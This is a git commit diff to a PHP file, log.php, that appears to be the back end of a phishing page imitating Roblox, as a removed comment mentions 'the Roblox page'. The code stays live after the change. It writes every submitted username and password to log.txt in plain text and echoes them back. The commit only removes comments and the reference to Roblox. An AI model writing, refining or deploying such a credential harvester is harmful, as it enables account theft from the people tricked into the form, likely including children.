6e05b2f702513b59a8308cd19bf994f53fa97788
nexusmaster205live-boop <nexusmaster205live@gmail.com>
2026-09-07 01:09:42 +0200

    Update log.php

--- log.php
+++ log.php
@@ -3,17 +3,12 @@
         $username = $_POST['username'];
         $password = $_POST['password'];
         
-        // Save to file
         $file = fopen('log.txt', 'a');
         fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
         fclose($file);
         
-        // Show the data on screen
         echo "Username: " . $username . "<br>Password: " . $password;
-    }
-    
-    // If no data sent, show the form (optional, but good for testing)
-    if ($_SERVER['REQUEST_METHOD'] != 'POST') {
-        echo "No data received yet. Go to the Roblox page, fill it out, and click Submit.";
+    } else {
+        echo "No data received yet.";
     }
 ?>
